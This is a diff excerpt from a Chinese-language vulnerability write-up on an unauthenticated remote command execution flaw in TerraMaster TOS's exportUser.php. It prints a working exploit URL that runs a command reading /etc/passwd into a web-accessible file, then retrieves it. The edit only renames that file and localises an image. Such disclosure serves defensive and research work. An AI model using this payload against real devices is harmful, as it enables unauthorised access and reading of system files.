@@ -55,13 +55,13 @@ TerraMaster TOS exportUser.php 文件中存在远程命令执行漏洞
 由于*exportUser.php*没有身份验证控件，因此未经身份验证的攻击者有可能通过提供以下值作为HTTP GET参数来实现代码执行。
 
 ```
-http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>test.txt
+http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>pq.txt
 ```
 
 返回200后再次访问
 
 ````
-http://xxx.xxx.xxx.xxx/include/test.txt
+http://xxx.xxx.xxx.xxx/include/pq.txt
 ````
 
-![](http://wikioss.peiqi.tech/vuln/tm-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image/tm-9.png)
